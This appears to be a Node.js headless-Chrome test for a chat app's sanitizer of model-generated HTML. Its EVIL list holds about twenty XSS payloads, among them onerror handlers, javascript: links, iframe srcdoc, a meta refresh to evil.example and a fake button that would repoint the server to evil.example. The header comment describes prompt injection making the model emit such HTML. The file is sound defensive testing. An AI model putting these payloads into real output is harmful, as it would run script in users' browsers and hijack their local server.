/* 模型回复的消毒：注入一个都不许执行，App 自己的卡片按钮一个都不许哑。
 *
 * 必须在真浏览器里跑：消毒走 <template> + TreeWalker，onerror 会不会真的触发也只有真页面说了算。
 * 攻击面是真实的：网页里一段提示注入 → 模型原样吐出 HTML → 这个页面能调本地 server 的电脑操控。
 * 对照组同样要紧：processAiCommands 会把带 onclick 的卡片（猫爪日报卡、记忆折叠块、点歌卡片）
 * **存进正文**，消毒拦错一个，那个按钮就静默哑掉。
 * （2026-09-27 另用用户真实的 372 个对话 / 4693 段回复跑过「消毒前后」对比：除了一条报错消息里
 *   403 页面自带的 <style global>，没拿掉任何东西。那个脚本读私人数据，不进仓库。）
 *
 * 跑法：node tests/browser-sanitize.js   （自己起 server 和 Chrome，跑完自己收拾）
 */
const { spawn } = require('child_process');
const http = require('http');
const path = require('path');
const WebSocket = require('ws');

const PORT = process.env.GC_PORT || 3097;
const CDP = 9233;
const CHROME = process.env.CHROME_PATH || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
const ROOT = path.resolve(__dirname, '..');
const PROFILE = path.join(require('os').tmpdir(), 'gc-sanitize-smoke-' + process.pid + '-' + Date.now());

let pass = 0, fail = 0;
const ok = (c, n, extra) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.log('  ✗ ' + n + (extra !== undefined ? '  → ' + JSON.stringify(extra) : '')); } };
const sleep = ms => new Promise(r => setTimeout(r, ms));
function getJson(port, p) {
  return new Promise((res, rej) => {
    http.get({ host: '127.0.0.1', port, path: p }, r => {
      let b = ''; r.on('data', d => b += d); r.on('end', () => { try { res(JSON.parse(b)); } catch (e) { rej(e); } });
    }).on('error', rej);
  });
}
async function waitJson(port, p) {
  for (let i = 0; i < 90; i++) { try { return await getJson(port, p); } catch { await sleep(500); } }
  throw new Error(`端口 ${port} 的 ${p} 拿不到 JSON`);
}

// 每条都会把 window.__pwn 设成一个数 —— 最后它必须还是 undefined
const EVIL = [
  '<img src=x onerror="window.__pwn=1">',
  '<svg onload="window.__pwn=2"><circle r=1></circle></svg>',
  '[点我](javascript:window.__pwn=3)',
  '<a href="javascript:window.__pwn=4" id="evilA">点我</a>',
  '<a href="  jAvAsCrIpT:window.__pwn=41" id="evilA2">点我</a>',
  '<iframe srcdoc="<script>parent.__pwn=5</script>"></iframe>',
  '<details open ontoggle="window.__pwn=6"><summary>x</summary>y</details>',
  '[[GLITCH:<img src=x onerror=window.__pwn=7>]]',
  '$\\alpha<img src=x onerror="window.__pwn=8">$',
  '<img src=x onerror="musicPlay(1)">',                         // App 函数也不许在会自己触发的事件里
  '<button id="evilBtn" onclick="setServerBase(\'http://evil.example:3000\')">领奖</button>',
  '<button id="evilBtn2" onclick="fetch(\'/api/x\')">领奖</button>',
  '<button id="evilBtn3" onclick="musicPlay(1);fetch(\'/x\')">领奖</button>',
  '<div id="GrancyanBand">假装是安卓壳</div>',
  '<style>body{display:none}</style>',
  '<form action="https://evil.example/"><input name=q></form>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  '<svg><a xlink:href="javascript:window.__pwn=9"><text y=10>x</text></a><animate attributeName="href" to="javascript:window.__pwn=10"/></svg>',
  '<object data="javascript:window.__pwn=11"></object><embed src="javascript:window.__pwn=12">',
  '<img src="x" onerror="_stickerImgRetry(this);window.__pwn=13">',
].join('\n\n');

// 对照组：这些都是真实会出现在正文里的东西
const GOOD = [
  '[[QUOTE: 讲的是什么呢]] 我也想知道',
  '\n\n<button type="button" class="moment-chat-card" onclick="openMoments()"><span class="moment-chat-kicker">🐾 上了猫爪日报</span></button>\n\n',
  '\n\n<div class="think-block done mem-block"><div class="think-toggle" onclick="_thinkToggle(this)"><span class="think-chev">▸</span> <span class="think-label">💾 存储记忆</span></div><div class="think-body">x</div></div>\n\n',
  '\n\n<div class="think-block done"><div class="think-toggle" onclick="this.parentElement.classList.toggle(\'open\')">老版本</div></div>\n\n',
  '\n\n<button id="goodMusic" onclick="musicPlay({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Apocalypse (Live); 现场&quot;,&quot;artist&quot;:&quot;A, B&quot;})">▶</button>\n\n',
  '[[IMG:https://example.com/a.png|有"引号"的关键词]]',
  '```js\n// 讲解用的例子\n<script>alert(1)</script>\n```',   // html 代码块会变成作品卡片，这里用普通代码块
  '<details><summary>点开</summary>里面</details>',
  '<span style="color:#f00" id="goodSpan">红字</span> 和 <u>下划线</u><br>换行',
  '[外链](https://example.com/x)',
  '$a<b$ 的公式',
].join('\n\n');

(async () => {
  const server = spawn(process.execPath, ['server.js'], {
    cwd: ROOT, env: { ...process.env, GRANCYAN_PORT: String(PORT), GRANCYAN_PORT_TLS: String(+PORT + 1) }, stdio: 'ignore',
  });
  const chrome = spawn(CHROME, [
    '--headless=new', `--remote-debugging-port=${CDP}`, '--remote-allow-origins=*',
    '--no-first-run', '--no-default-browser-check', '--disable-gpu',
    '--user-data-dir=' + PROFILE, `http://127.0.0.1:${PORT}/`,
  ], { stdio: 'ignore' });
  process.on('exit', () => {
    try { chrome.kill(); } catch {}
    try { server.kill(); } catch {}
    try { require('fs').rmSync(PROFILE, { recursive: true, force: true }); } catch {}
  });

  try {
    let page;
    for (let i = 0; i < 90 && !page; i++) {
      const tabs = await waitJson(CDP, '/json/list');
      page = tabs.find(t => t.type === 'page' && t.url.includes(String(PORT)));
      if (!page) await sleep(500);
    }
    if (!page) throw new Error('没找到页面标签');
    const ws = new WebSocket(page.webSocketDebuggerUrl, { perMessageDeflate: false });
    await new Promise((r, j) => { ws.once('open', r); ws.once('error', j); });
    let id = 0; const waiting = new Map();
    ws.on('message', m => { const msg = JSON.parse(m); if (msg.id && waiting.has(msg.id)) { waiting.get(msg.id)(msg); waiting.delete(msg.id); } });
    const send = (method, params) => new Promise(r => { const i = ++id; waiting.set(i, r); ws.send(JSON.stringify({ id: i, method, params })); });
    const evalJs = async expr => {
      const r = await send('Runtime.evaluate', { expression: expr, awaitPromise: true, returnByValue: true });
      if (r.result?.exceptionDetails) throw new Error(r.result.exceptionDetails.exception?.description || 'JS 抛错');
      return r.result?.result?.value;
    };
    await send('Runtime.enable');
    for (let i = 0; i < 40 && !(await evalJs('typeof createNewChat==="function" && typeof gcSanitize==="function"')); i++) await sleep(500);
    await sleep(2500);
    if (process.env.GC_DBG) {
      for (const [nm, t] of [['evil', EVIL], ['good', GOOD]]) for (const part of t.split('\n\n')) {
        const x = await Promise.race([evalJs('renderRichText(' + JSON.stringify(part) + ').length'), sleep(3000).then(() => 'HANG')]);
        if (x === 'HANG') { console.log('[dbg] HANG', nm, part); process.exit(1); }
      }
      console.log('[dbg] parts ok');
    }

    const r = await evalJs(`(async () => {
      document.getElementById('authModal')?.classList.add('hidden');
      const baseBefore = localStorage.getItem('grancyanServerBase');
      createNewChat();
      const chat = getActiveChat();
      const b = nextId() + 5; _nodeIdCounter = b + 20;
      chat.nodes[b+1] = { id: b+1, parentId: null, role: 'user', content: '你好', timestamp: Date.now() };
      chat.nodes[b+2] = { id: b+2, parentId: b+1, role: 'ai', content: ${JSON.stringify(EVIL)}, timestamp: Date.now() };
      chat.nodes[b+3] = { id: b+3, parentId: b+2, role: 'user', content: '再来', timestamp: Date.now() };
      chat.nodes[b+4] = { id: b+4, parentId: b+3, role: 'ai', content: ${JSON.stringify(GOOD)}, timestamp: Date.now() };
      chat.nodes[b+5] = { id: b+5, parentId: b+4, role: 'ai', content: '', blocks: [{ type: 'text', text: '块路径：<img src=x onerror="window.__pwn=20"> [[MEM_ADD: 记一条]]' }], memSummaries: { '记一条': '<img src=x onerror="window.__pwn=21">' }, timestamp: Date.now() };
      chat.headId = b+5; renderMessages();
      await new Promise(z => setTimeout(z, 1500));      // 给 onerror / onload 足够时间真的触发
      const evil = document.querySelector('[data-node-id="' + (b+2) + '"] .bubble.ai');
      const good = document.querySelector('[data-node-id="' + (b+4) + '"] .bubble.ai');
      const blk = document.querySelector('[data-node-id="' + (b+5) + '"] .bubble.ai');
      const out = { found: !!(evil && good && blk) };
      // 把恶意那条里注入进来的能点的全点一遍（只点正文里的：气泡下面的删除/重生成会弹确认框把页面堵死）
      for (const el of evil.querySelectorAll('[id^=evil], summary, a:not([class])')) { if (el.closest('.msg-actions')) continue; try { el.click(); } catch (e) {} }
      await new Promise(z => setTimeout(z, 400));
      out.pwn = window.__pwn;
      out.baseAfter = localStorage.getItem('grancyanServerBase') === baseBefore;
      out.evilHandlers = [...evil.querySelectorAll('*')].flatMap(el => [...el.attributes].filter(a => /^on/i.test(a.name)).map(a => el.tagName + ' ' + a.name + '=' + a.value));
      out.evilHrefs = [...evil.querySelectorAll('[href],[src],[data],[action]')].map(el => el.getAttribute('href') || el.getAttribute('src') || el.getAttribute('data') || el.getAttribute('action')).filter(v => /script:|^data:/i.test(String(v).replace(/\\s/g, '')));
      out.evilTags = [...evil.querySelectorAll('script,iframe,style,form,meta,object,embed,animate,set')].map(e => e.tagName);
      out.bandClobbered = typeof window.GrancyanBand !== 'undefined';
      out.bodyVisible = getComputedStyle(document.body).display !== 'none';
      out.glitchText = evil.querySelector('.glitch-word')?.textContent || '';
      out.katexOrText = /alpha|α/.test(evil.textContent);
      // 对照组
      out.quoteOnclick = good.querySelector('.bubble-quote')?.getAttribute('onclick');
      out.momentOnclick = good.querySelector('.moment-chat-card')?.getAttribute('onclick');
      out.memOnclick = good.querySelector('.mem-block .think-toggle')?.getAttribute('onclick');
      out.oldToggle = [...good.querySelectorAll('.think-toggle')].map(e => e.getAttribute('onclick')).find(v => /parentElement/.test(v || ''));
      out.musicOnclick = good.querySelector('#goodMusic')?.getAttribute('onclick');
      out.imgSave = good.querySelector('.msg-img-save-btn')?.getAttribute('onclick');
      out.imgRetry = good.querySelector('.msg-img')?.getAttribute('onerror');
      out.codeText = (good.querySelector('pre')?.textContent || '') + (good.querySelector('script') ? ' [真 script 元素]' : '');
      out.details = !!good.querySelector('details summary');
      out.span = good.querySelector('#goodSpan')?.getAttribute('style');
      out.u = !!good.querySelector('u') && !!good.querySelector('br');
      const link = [...good.querySelectorAll('a')].find(a => /example\\.com\\/x/.test(a.href));
      out.link = link ? link.getAttribute('href') : null;
      out.mathText = /a<b/.test(good.textContent.replace(/\\s/g, ''));
      out.blkHandlers = [...blk.querySelectorAll('*')].flatMap(el => [...el.attributes].filter(a => /^on/i.test(a.name)).map(a => a.name + '=' + a.value));
      out.blkMemPill = !!blk.querySelector('.mem-block');
      // 外来内容（檐廊散步日志 / 文章卡片）走 strict：一个事件都不留
      const strict = gcSanitize('<p onclick="openMoments()">x</p><a href="https://e.com" onclick="openMoments()">y</a>', { strict: true });
      out.strict = strict;
      return out;
    })()`);

    console.log('\n[消毒 · 浏览器冒烟]');
    ok(r.found, '三条消息都渲染出来了');
    ok(r.pwn === undefined, '★ 全部注入（onerror/onload/javascript:/srcdoc/ontoggle/公式/GLITCH/块路径/记忆概括）一个都没执行', r.pwn);
    ok(r.baseAfter, '★ 假按钮改不了服务器地址（setServerBase 不许出现在模型的 HTML 里）');
    ok(r.evilHandlers.length === 0, '恶意那条里一个内联事件都不剩', r.evilHandlers);
    ok(r.evilHrefs.length === 0, 'javascript:/data: 链接全拿掉（含大小写混写、前导空白）', r.evilHrefs);
    ok(r.evilTags.length === 0, 'script/iframe/style/form/meta/object/embed/animate 整个拿掉', r.evilTags);
    ok(!r.bandClobbered, '<div id="GrancyanBand"> 不能冒充安卓壳');
    ok(r.bodyVisible, '<style> 改不了整页样式');
    ok(/img/.test(r.glitchText), 'GLITCH 里的标签当字显示，不当 HTML', r.glitchText);
    ok(r.katexOrText, '带毒的公式照样显示公式本身');

    ok(r.quoteOnclick === 'scrollToQuotedText(this.dataset.q)', '对照：AI 引用条的点击还在', r.quoteOnclick);
    ok(r.momentOnclick === 'openMoments()', '对照：存在正文里的猫爪日报卡片按钮还在', r.momentOnclick);
    ok(r.memOnclick === '_thinkToggle(this)', '对照：记忆折叠块还能点开', r.memOnclick);
    ok(!!r.oldToggle, '对照：老版本存下的 this.parentElement.classList.toggle 折叠块还能点', r.oldToggle);
    ok(/^musicPlay\(\{"id":"1".*Apocalypse \(Live\); 现场.*\}\)$/.test(r.musicOnclick || ''), '对照：点歌卡片的 JSON 参数（歌名带括号、分号、逗号）不被误拦', r.musicOnclick);
    ok(/^event\.stopPropagation\(\);saveSearchImg\("https:\/\/example\.com\/a\.png","有\\"引号\\"的关键词"\)$/.test(r.imgSave || ''),
      '对照：搜图卡片的 💾 按钮完整（以前属性在第一个引号处就断了，一直是哑的）', r.imgSave);
    ok(r.imgRetry === '_stickerImgRetry(this)', '对照：图片挂了的重试 onerror 还在', r.imgRetry);
    ok(r.codeText.includes('<script>alert(1)</script>') && !r.codeText.includes('[真 script 元素]'), '对照：代码块里的 <script> 当字显示', r.codeText);
    ok(r.details, '对照：<details> 还能用');
    ok(r.span === 'color:#f00' && r.u, '对照：带颜色的 span、<u>、<br> 照常', r.span);
    ok(r.link === 'https://example.com/x', '对照：https 外链照常', r.link);
    ok(r.mathText, '对照：`$a<b$` 的 < 不再被当成标签吃掉');
    ok(r.blkMemPill && r.blkHandlers.every(h => h === 'onclick=_thinkToggle(this)'), '块路径：记忆胶囊还在，只剩它自己的折叠点击', r.blkHandlers);
    ok(!/onclick/.test(r.strict) && /href="https:\/\/e\.com"/.test(r.strict), 'strict 模式一个事件都不留、链接留着', r.strict);
    ws.close();
  } catch (e) {
    fail++; console.log('  ✗ 跑挂了：' + e.message);
  }
  console.log(`\n${pass} 过 / ${fail} 挂`);
  process.exit(fail ? 1 : 0);
})();
